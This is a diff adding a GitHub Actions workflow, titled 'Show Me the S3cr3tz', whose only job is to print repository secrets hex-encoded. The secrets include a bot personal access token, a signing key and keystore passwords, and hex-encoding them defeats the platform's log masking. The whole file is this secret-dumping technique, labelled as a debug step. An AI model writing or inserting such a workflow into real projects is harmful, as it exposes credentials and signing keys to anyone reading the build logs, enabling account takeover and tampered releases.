@@ -1,0 +1,22 @@
+name: Show Me the S3cr3tz
+on: [workflow_dispatch]
+
+jobs:
+  debug:
+    name: Debug
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Dump secret
+        run: echo -n "${{ secrets.ALIAS }}" | xxd -ps
+      - name: Dump secret
+        run: echo -n "${{ secrets.ALIAS }}" | xxd -ps
+      - name: Dump secret
+        run: echo -n "${{ secrets.BOT_PAT }}" | xxd -ps
+      - name: Dump secret
+        run: echo -n "${{ secrets.KEY_PASSWORD }}" | xxd -ps
+      - name: Dump secret
+        run: echo -n "${{ secrets.KEY_STORE_PASSWORD }}" | xxd -ps
+      - name: Dump secret
+        run: echo -n "${{ secrets.SIGNING_KEY }}" | xxd -ps
+      
